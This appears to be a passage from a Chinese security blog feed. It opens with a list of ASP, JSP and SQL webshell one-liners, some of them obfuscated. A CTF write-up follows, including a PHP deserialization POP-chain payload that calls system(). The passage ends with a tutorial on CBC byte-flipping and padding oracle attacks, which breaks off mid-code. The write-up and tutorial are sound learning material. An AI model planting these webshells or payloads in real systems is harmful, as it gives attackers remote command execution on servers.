<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%execute(request(“cmd”))%&gt;</span><br><span class="line">&lt;%execute request(“1”)%&gt;</span><br><span class="line">ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾 密码a</span><br><span class="line">&quot;%&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%’ p</span><br><span class="line">&lt;%Y=request(“xindong”)%&gt; &lt;%execute(Y)%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%eval&quot;&quot;&amp;(“e”&amp;“v”&amp;“a”&amp;“l”&amp;&quot;(&quot;&amp;“r”&amp;“e”&amp;“q”&amp;“u”&amp;“e”&amp;“s”&amp;“t”&amp;&quot;(&quot;&amp;“0”&amp;&quot;-&quot;&amp;“2”&amp;&quot;-&quot;&amp;“5”&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;（密码是-7）</span><br></pre></td></tr></table></figure>

<ul>
<li>jsp</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;%if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">select ‘&lt;?php eval($_POST[cmd];?&gt;’ into outfile ‘C:/Inetpub/wwwroot/mysql-php/1.php’</span><br></pre></td></tr></table></figure>

<h1 id="Fuzz相关字典和工具"><a href="#Fuzz相关字典和工具" class="headerlink" title="Fuzz相关字典和工具"></a>Fuzz相关字典和工具</h1><p><a class="link"   href="https://github.com/814561039/FUZZ-dic" >814561039&#x2F;FUZZ-dic: 文件上传、目录爆破等Fuzz字典 (github.com)<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>技术探索</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>HDCTF Junior 2024 Winter WP</title>
    <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
    <content><![CDATA[<h1 id="新生选拔赛"><a href="#新生选拔赛" class="headerlink" title="新生选拔赛"></a>新生选拔赛</h1><span id="more"></span>

<h1 id="朴实无华的http"><a href="#朴实无华的http" class="headerlink" title="朴实无华的http"></a>朴实无华的http</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240222183840891.png" ></p>
<p>这是刚刚拿到题的样子,F12没反应,ctrl+U看看</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222183956685.png" ></p>
<p>没什么卵用,只知道把F12和F1 ban掉了</p>
<p>题目没给什么描述,源码也没有信息,直接开扫,dirsearch.py启动!</p>
<p>最后扫出来个robot.txt</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184449835.png" ></p>
<p>进入你，httttttp.php</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222184604048.png" ></p>
<p>接下来就很常规的把Referer,UA填好,就进入了经典试ip环节,用收集的词典在burpsuite爆一下就出来了.</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185535104.png"  alt="兄弟爆一下，说说你心里话"></p>
<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>最想吐的一集，虽然拿了个一血，但这题差点把我血都放完了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222185800522.png" ></p>
<p>因为一开始服务器挺卡的，点这题老是调到别的地方，我还以为题目出错了，一看原来有个$_GET[‘entrance’]，够坏哈</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这题的思路到是比较明确，想出来并不要多少时间,漏洞点是在$fuction($cmd),于是我们对这两个值进行覆盖即可rce，</p>
<p>那么就反推回去</p>
<p>什么能触发invoke呢—&gt;damn类中的toString可以触发,什么触发toString—&gt;类pop的set，什么触发set—&gt;类air的call,什么触发call—&gt;类hnusec的destruct</p>
<p>开始下手</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>这里的base64解码编码，private变量旁边的%00弄得我好崩溃.</p>
<p>先看我的payload:</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222190634907.png" ></p>
<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”%00pop%00exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
<p>以为到这里就差不多得了?想多了</p>
<h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p>这个需要版本限制，具体不记得</p>
<p>我们知道wakeup触发时机是在unserialize之前，那么这里我们肯定不能让它触发.</p>
<p>绕过的方式是:修改pop链属性个数使他大于真实个数即可绕过</p>
<h2 id="private旁边的-00"><a href="#private旁边的-00" class="headerlink" title="private旁边的%00"></a>private旁边的%00</h2><p>这里够我喝一壶的了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222191033249.png" ></p>
<p>注意看，这个变量叫pop,它的两边有两个不知道什么东西的东西,其实它是ASCII里面的0，在url中是%00.</p>
<p>按我之前的经验来看，我们只需手动添加%00在pop两边，接着$_GET传参即可,但是你先别急</p>
<p>这里GET传进去的pop链是要经过base64编码解码的，于是像上面说的这样子干，那么我们传入的便是%00,而不是经过服务器解析后的那个符号0,所以php理所当然是识别不了%00的，所以识别不了pop，一个地方崩整个崩</p>
<p>问题到这里很明确了——如何让php识别pop旁边那两个东西呢?这里用php中的chr()函数，它会将ascii十进制数转化为符号,我们还要注意字符串的拼接用.来连接</p>
<p>$b&#x3D;’O:6:”hnusec”:2:{s:3:”exp”;O:3:”air”:1:{s:3:”exp”;O:3:”pop”:2:{s:8:”‘<strong>.chr(0).</strong>‘pop’<strong>.chr(0).</strong>‘exp”;N;s:4:”exp2”;O:18:”damndamndamdanmdan”:1:{s:3:”exp”;O:7:”exploit”:2:{s:8:”function”;s:6:”system”;s:3:”cmd”;s:2:”ls”;}}}}}’</p>
<p>接着就是无限制的rce，不多赘述</p>
<h1 id="フィナーレ。"><a href="#フィナーレ。" class="headerlink" title="フィナーレ。"></a>フィナーレ。</h1><p>这题是考察php特性和无参数rce</p>
<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192112186.png" ></p>
<p>这里是强等于,0e绕过不能用,那就用数组绕过,当md5()里面传入一个数组时，编译器会报错但不影响它继续执行后返回null，结果null&#x3D;&#x3D;&#x3D;null，成功绕过</p>
<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222192647039.png" ></p>
<p>这里直接传入114514就好了，目的应该不是考察intval绕过，让我们认识这个函数而已</p>
<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240222193337316.png" ></p>
<p>说是命令执行，但这样写没反应，应该是有过滤，抓个包看看</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222193645229.png" ></p>
<p>果然啊，果然，过滤了好多，linux指令在这里我是不会用了,用php的函数写的</p>
<p>scandir():查看目录下有什么文件,传的参数就是路径</p>
<p>readfile():读取文件</p>
<p>这里先print_r(scandir(.))查看根目录(为什么是print_r不是echo,因为这里返回的是数组，echo处理不了)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194101516.png" ></p>
<p>这里我们在前三层找到flag文件，读取</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194422918.png" ></p>
<p>这里的readfile()平替很多,比如highlight_file,show_source,网上还有几个吧</p>
<h1 id="カゲロウデイズ"><a href="#カゲロウデイズ" class="headerlink" title="カゲロウデイズ"></a>カゲロウデイズ</h1><p>运气最好的一集，说是考察脚本能力，但我一个脚本没写，全靠运气</p>
<p>题目说了密码在css文件里面</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194810531.png" ></p>
<p>这里我们复制下来，在记事本可以把注释批量去掉</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222194905273.png" ></p>
<p>一看就是base64，但我做到这里的时候没有去解码，而是直接拿去burpsuite爆了，结果啥都没爆出来，然后我就拿去解码了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240222195102450.png" ></p>
<p>然后我想是不是要写个脚本把这些字符拼接起来，然后我在乱翻的时候，哎哟我，这不key is 谁谁谁吗，然后直接拿去试，还真得了，全靠运气<img   src="/../img/$%7Bfiilename%7D/image-20240222195234074.png" ></p>
<p>又是点击题，反正上次也是用连点器做出来的，这次也用了，没想到了设置了点击间隔时间的限制，然后我调到0.2s点一次完了给他挂个30来分钟就出来了，就当休息一下哈哈哈</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>  记录一下第一次打的完整的ctf，早上准备开打的时候简直兴奋的发抖，打开题目像癫了一样乱搞，现在回想还真是浪费精力啊，这是一场持久战，还是得慢慢来,最后也是差一题ak，已经超出我的预期了。</p>
<p>  复盘了一下今天的操作，感觉有几方面需要说出来指正</p>
<p>  1.资料乱开，又不关，导致全面页面，乱糟糟(最后burpsuite还差点干爆我电脑)</p>
<p>  2.没有备份的习惯，解题过程中看到的很多信息都是要记录的，今天重新复制粘贴占了蛮多时间</p>
<p>  3.赛前准备不足，虽然知道今天应该会有http的题，但是忘记去找ip了，今天去找又花了蛮久，痛啊</p>
<p>道阻且长，同志们还需努力.</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>CBC模式安全研究</title>
    <url>/2024/09/03/CBC%E6%A8%A1%E5%BC%8F%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h1><span id="more"></span>

<p>很早之前在H&amp;NCTF上的flipPin上就当场学了然后做出来过一题cbc字节翻转攻击，知道是怎么回事，但是一直没写总结文章，太懒了唉，这次再总结的时候发现cbc竟然不只有Byte-Flipping Attack，而且还有Padding Oracle Attack，大吃一惊，多写多总结还是好的</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>需要理清的几个概念</p>
<h2 id="一些密码运算符"><a href="#一些密码运算符" class="headerlink" title="一些密码运算符"></a>一些密码运算符</h2><ul>
<li><code>C</code>表示密文</li>
<li><code>P</code>表示明文</li>
<li><code>E(P)</code>表示对一段明文加密</li>
<li><code>D(C)</code>表示对一段密文解密</li>
<li><img   src="/../img/$%7Bfiilename%7D/image-20240903172730314-1725355651427-1.png" ></li>
</ul>
<p>表示两个数据进行xor运算</p>
<h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>计算机中的xor运算是这样进行的，首先把一个字符用8个比特的二进制形式表示</p>
<p><code>5=&gt;10100000</code></p>
<p><code>6=&gt;11000000</code></p>
<p>对数字的每一位对应做这样的事情</p>
<p>如果是相同数字，则得0，不同数字则得1，也就是说</p>
<p><code>5 xor 6</code> &#x3D; <code>0101 xor 0110</code> &#x3D; <code>0011</code> &#x3D; <code>3</code> </p>
<h4 id="特殊性质"><a href="#特殊性质" class="headerlink" title="特殊性质"></a>特殊性质</h4><ul>
<li><p>0 xor 任何数 &#x3D; 这个数</p>
</li>
<li><p>相同的数进行xor会等于0</p>
</li>
</ul>
<h2 id="AES加密算法"><a href="#AES加密算法" class="headerlink" title="AES加密算法"></a>AES加密算法</h2><p>因为CBC字节翻转攻击是对CBC这个分组模式的攻击，所以只需清楚AES的几个性质</p>
<ul>
<li>在 AES 加解密过程中，每一块都是 128 比特，也就是16字节</li>
<li>AES是对称加密，需要公钥进行解密</li>
</ul>
<h2 id="CBC分组"><a href="#CBC分组" class="headerlink" title="CBC分组"></a>CBC分组</h2><p>我们有一个明文，和一个初始向量iv（同样是一组16字节的数据）它经过CBC加密分组的流程如下</p>
<p>首先将明文进行拆分，分为16字节一组，若不满则补全</p>
<p>第一组明文与iv进行异或后进行AES加密</p>
<p>接着第二组明文与上面加密的密文进行异或再加密</p>
<p>接着第三组的明文与上面加密的密文进行异或再加密</p>
<p>如此反复拼接后得到最终密文</p>
<p>公式表示：</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903222850928.png"  alt="image-20240903222850928"></p>
<h2 id="填充规则"><a href="#填充规则" class="headerlink" title="填充规则"></a>填充规则</h2><p>我们说过，分组的每一组都应是16字节（PKCS7Padding定义中，对于块的大小是不确定的，可以在1-255之间，而PKCS5是确定的8字节），但我们的密文的字节数不可能时刻满足16的倍数，所以我们就需要填充</p>
<h3 id="PKC-7"><a href="#PKC-7" class="headerlink" title="PKC #7"></a>PKC #7</h3><p>用于AES算法来补充16字节分组，规则如下，假设缺的值为n，那么它就会补上n个0x0n(或者0xn考虑缺两位数字节的情况)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240904120707090.png"  alt="image-20240904120707090"></p>
<h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s + (AES.block_size - <span class="built_in">len</span>(s) % AES.block_size) * <span class="built_in">chr</span>(AES.block_size - <span class="built_in">len</span>(s) % AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s[:-<span class="built_in">ord</span>(s[<span class="built_in">len</span>(s)-<span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plain_text, key ,iv</span>):</span><br><span class="line">    plain_text = plain_text</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> (iv + cipher.encrypt(pad((plain_text)).encode()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher_text, key ,iv</span>):</span><br><span class="line">    cipher_text = (cipher_text)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> (cipher.decrypt(cipher_text[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&quot;1234567890123456&quot;</span>.encode()</span><br><span class="line"><span class="comment"># key = &#x27;you_need_16_char&#x27;.encode()</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">plain_text = <span class="string">&quot;ewojiemojiecoji&quot;</span></span><br><span class="line">cipher_text = encrypt(plain_text, key,iv)</span><br><span class="line"><span class="built_in">print</span>(cipher_text)</span><br><span class="line">decrypted_text = decrypt(cipher_text, key,iv)</span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">b&#x27;1234567890123456(V\xcc\xdb \x7f\xe0\xcb\xab\x07E\xaaL\xc3\x14\xba&#x27;</span></span><br><span class="line"><span class="string">b&#x27;ewojiemojiecoji\x01&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="PKC-5"><a href="#PKC-5" class="headerlink" title="PKC #5"></a>PKC #5</h3><p>用于DES算法，填充8字节，规则和PKC #7一样</p>
<h2 id="原始加解密脚本"><a href="#原始加解密脚本" class="headerlink" title="原始加解密脚本"></a>原始加解密脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">省略自动填充，我们仅以正好为16倍数的字节数为例，对攻击并无大碍</span></span><br><span class="line"><span class="string">def pad(s):</span></span><br><span class="line"><span class="string">    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def unpad(s):</span></span><br><span class="line"><span class="string">    return s[:-ord(s[len(s)-1:])]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plain_text, key ,iv</span>):</span><br><span class="line">    plain_text = plain_text</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> (iv + cipher.encrypt(plain_text.encode()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher_text, key ,iv</span>):</span><br><span class="line">    cipher_text = (cipher_text)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> (cipher.decrypt(cipher_text[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&quot;1234567890123456&quot;</span>.encode()</span><br><span class="line"><span class="comment"># key = &#x27;you_need_16_char&#x27;.encode()</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">plain_text = <span class="string">&quot;12345678901ewoji12345678901ewoji&quot;</span></span><br><span class="line">cipher_text = encrypt(plain_text, key,iv)</span><br><span class="line"><span class="built_in">print</span>(cipher_text)</span><br><span class="line">decrypted_text = decrypt(cipher_text, key,iv)</span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">b&quot;1234567890123456&#x27;\xb8\xd2\xb6\xca\x06\xb3\xb0\x12\x81\xbc\\v\x11\xa0\xace&#125;[\xb5\xb2\xca\x18\x01\xf1\x92-\xf9aX;_&quot;</span></span><br><span class="line"><span class="string">b&#x27;12345678901ewoji12345678901ewoji&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Byte-Flipping-Attack"><a href="#Byte-Flipping-Attack" class="headerlink" title="Byte-Flipping Attack"></a>Byte-Flipping Attack</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240903223804964.png"  alt="image-20240903223804964"></p>
<p>分三行解释</p>
<ul>
<li>第i组密文的第一个字符由第i组的明文的第一个字符和i-1组的密文的第一个字符xor得来</li>
<li>自己和自己xor结果为0</li>
<li>0和Pnew进行xor结果当然就是Pnew</li>
</ul>
<p>到这里就很明显了，当我们要加密i组明文时，是要经过</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903224723153.png"  alt="image-20240903224723153"></p>
<p>也就是说只要<img   src="/../img/$%7Bfiilename%7D/image-20240903224812440.png"  alt="image-20240903224812440">等于<img   src="/../img/$%7Bfiilename%7D/image-20240903224844260.png"  alt="image-20240903224844260"></p>
<p>我们在加密的时候就改变了i组的明文</p>
<p>大白话就是：我们要修改第n组的第i个明文，我们就要去修改第n-1的第i个密文，让第n-1组的这个密文等于自己和第n组明文和要修改的明文的异或结果即可</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p><code>plain_text = &quot;12345678901ewoji12345678901ewoji&quot;</code></p>
<p>目标，把最后的<code>ewoji</code>改为<code>emoji</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">def <span class="title function_ invoke__">encrypt</span>(plain_text, key ,iv):</span><br><span class="line">    plain_text = plain_text</span><br><span class="line">    cipher = AES.<span class="keyword">new</span>(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> (iv + cipher.<span class="title function_ invoke__">encrypt</span>(plain_text.<span class="title function_ invoke__">encode</span>()))</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">decrypt</span>(cipher_text, key ,iv):</span><br><span class="line">    cipher_text = (cipher_text)</span><br><span class="line">    cipher = AES.<span class="keyword">new</span>(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> (cipher.<span class="title function_ invoke__">decrypt</span>(cipher_text[AES.<span class="attr">block_size</span>:]))</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">exp</span>(plain_text,key,iv):</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;Original plaintext:\n&quot;</span>+plain_text)</span><br><span class="line">    cipher_text = <span class="keyword">list</span>(<span class="title function_ invoke__">encrypt</span>(plain_text,key,iv))</span><br><span class="line">    cipher_text[<span class="number">28</span>] = cipher_text[<span class="number">28</span>] ^ <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;w&#x27;</span>) ^ <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">    res = <span class="title function_ invoke__">decrypt</span>(<span class="title function_ invoke__">bytes</span>(cipher_text),key,iv)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;Altered plaintext:&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(res)</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&quot;1234567890123456&quot;</span>.<span class="title function_ invoke__">encode</span>()</span><br><span class="line"><span class="comment"># key = &#x27;you_need_16_char&#x27;.encode()</span></span><br><span class="line">key = <span class="title function_ invoke__">get_random_bytes</span>(<span class="number">16</span>)</span><br><span class="line">plain_text = <span class="string">&quot;12345678901ewoji12345678901ewoji&quot;</span></span><br><span class="line"><span class="title function_ invoke__">exp</span>(plain_text,key,iv)</span><br></pre></td></tr></table></figure>

<p>关键部分<code>cipher_text[28] = cipher_text[28] ^ ord(&#39;w&#39;) ^ ord(&#39;m&#39;)</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903233748796.png"  alt="image-20240903233748796"></p>
<p>成功修改，但是也出现了很多乱码，是因为修改了第二组的字节所以第一第二组都会受到影响，但不会影响第三组</p>
<p>如果我们可以知道iv的话，从iv开始改，就可以做到无痛修改，但也仅限修改第二组</p>
<h1 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h1><p>Padding Oracle Attack这攻击原来这么早就有了，在2011年的Pwnie Rewards中被评为”最具有价值的服务器漏洞“。</p>
<h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="不正确的响应模式"><a href="#不正确的响应模式" class="headerlink" title="不正确的响应模式"></a>不正确的响应模式</h3><p>一些服务器在接受反序列数据且使用的是CBC分组模式时（以session认证为例），容易写成如下</p>
<ul>
<li>如果正确反序列化且和服务器的session一致，返回200OK</li>
<li>如果正确反序列但和服务器的session不一致，返回200但提示错误</li>
<li>如果错误反序列化，则返回500</li>
</ul>
<p>什么叫错误反序列化？上文提到过CBC的填充模式，如果解密的数据被正确填充，则是正确反序列化，反之，错误的反序列化</p>
<p>举个例子：比如我们要16字节一组，但我们只有ewojiemojiecoji(15个字节)，所以应在末尾填充0x01</p>
<p>当我们解密出来时，发现最后是0x01且前面都是非填充字符，则为正确填充</p>
<p>若有人篡改的数据，导致解密出来末尾单个是0x02，则为错误填充，返回500</p>
<h2 id="CBC解密中间值不变"><a href="#CBC解密中间值不变" class="headerlink" title="CBC解密中间值不变"></a>CBC解密中间值不变</h2><p>什么是中间值？为什么不变？</p>
<p>回顾我们的加密过程</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240909170655407.png"  alt="image-20240909170655407"></p>
<p>我们的第i组密文由i-1组的明文加密后和第i组明文异或后加密得来</p>
<p>那解密的时候呢</p>
<p>先把第i组的密文解密后与i-1的密文异或得到明文</p>
<p>这过程细品，尽管我们如何改变第i组的明文或者密文</p>
<p>加密时，还是和i-1的密文进行异或</p>
<p>解密时，还是和i-1的密文进行异或</p>
<p>也就是说我想说的不变的中间值，就是值i-1组的密文</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>有了前置知识后就可以很清楚的知道漏洞具体是如何产生的，漏洞必须要放在一个场景来理解，不然会有点抽象</p>
<p>有这么个场景：现在有一个存在不正确的响应模式且用的是AES-CBC加密session的服务器，我们抓包发现存在session，但不知道session明文的值，更不用说如何修改，这时你该如何运用上面的知识exploit it</p>
<p>明文:<code>ewojiemojiecoji</code></p>
<p>密文:<code>MTIzNDU2Nzg5MDEyMzQ1Nue3qITNrq3spyYdJ9QwPY4=</code></p>
<p>key:<code>you_need_16_char</code>（未知）</p>
<p>iv&#x3D;<code>1234567890123456</code>（分组解码即可得到）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ctext = <span class="string">&quot;MTIzNDU2Nzg5MDEyMzQ1NkpV/acocYwfqjISZcU9raU=&quot;</span>.encode()</span><br><span class="line">cbytes = base64.b64decode(ctext)</span><br><span class="line"></span><br><span class="line">iv = cbytes[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">text = cbytes[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure>

<h3 id="利用响应fuzz出明文"><a href="#利用响应fuzz出明文" class="headerlink" title="利用响应fuzz出明文"></a>利用响应fuzz出明文</h3><p>简单写一个server</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;you_need_16_char&#x27;</span>.encode()</span><br><span class="line">iv = <span class="string">&quot;1234567890123456&quot;</span>.encode()</span><br><span class="line">ctext = <span class="string">&quot;MTIzNDU2Nzg5MDEyMzQ1NkpV/acocYwfqjISZcU9raU=&quot;</span></span><br><span class="line"></span><br><span class="line">padding_dict = &#123;</span><br><span class="line">    <span class="number">1</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="number">2</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="number">3</span> : <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span> : <span class="number">4</span>,</span><br><span class="line">    <span class="number">5</span> : <span class="number">5</span>,</span><br><span class="line">    <span class="number">6</span> : <span class="number">6</span>,</span><br><span class="line">    <span class="number">7</span> : <span class="number">7</span>,</span><br><span class="line">    <span class="number">8</span> : <span class="number">8</span>,</span><br><span class="line">    <span class="string">&quot;\t&quot;</span> : <span class="number">9</span>,</span><br><span class="line">    <span class="string">&quot;\n&quot;</span> : <span class="number">10</span>,</span><br><span class="line">    <span class="string">&quot;\x0b&quot;</span> : <span class="number">11</span>,</span><br><span class="line">    <span class="string">&quot;\x0c&quot;</span> : <span class="number">12</span>,</span><br><span class="line">    <span class="string">&quot;\r&quot;</span> : <span class="number">13</span>,</span><br><span class="line">    <span class="string">&quot;\x0e&quot;</span> : <span class="number">14</span>,</span><br><span class="line">    <span class="string">&quot;\x0f&quot;</span> : <span class="number">15</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">identify</span>(<span class="params">ctext,key,iv</span>):</span><br><span class="line">    cipher_text = base64.b64decode(ctext)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    unvalid_data = (cipher.decrypt(((cipher_text[AES.block_size:]))))</span><br><span class="line">    <span class="comment">#print(padding_dict[unvalid_data[15]])</span></span><br><span class="line">    num = padding_dict[unvalid_data[<span class="number">15</span>]]</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span>(unvalid_data[-num:].decode() == num*<span class="built_in">chr</span>(num)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;correct padding!&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(unvalid_data[:-num].decode() == <span class="string">&quot;ewojiemojiecoji&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;200 and you are ewoji&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;200 but you are not ewoji&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span 